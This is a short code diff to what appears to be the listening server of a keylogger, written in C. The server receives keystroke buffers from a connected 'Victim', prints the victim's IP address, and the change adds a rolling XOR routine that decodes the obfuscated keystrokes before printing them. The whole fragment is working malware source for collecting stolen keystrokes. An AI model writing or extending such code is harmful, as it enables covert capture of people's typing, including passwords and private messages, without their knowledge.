@@ -49,7 +49,17 @@ void main(int argc, char *argv[]) {
 		}
 
 		keystrokeBuffer[recvMsgSize] = NULL;
-		printf("Victim [%s] Got [%d] characters [%s]\n", inet_ntoa(victimAddr.sin_addr), recvMsgSize, keystrokeBuffer);
+		printf("Victim [%s] Got [%d] characters [", inet_ntoa(victimAddr.sin_addr), recvMsgSize);
+
+
+		UCHAR mask = 0x65;
+		for (int i = 0; i < recvMsgSize; i++) {
+			UCHAR keystroke = (keystrokeBuffer[i]) ^ mask;
+			printf("%c", keystroke);
+			mask = keystroke ^ (i + 1);
+		}
+		printf("]\n");
+
 		closesocket(victimSocket);
 	}
 }
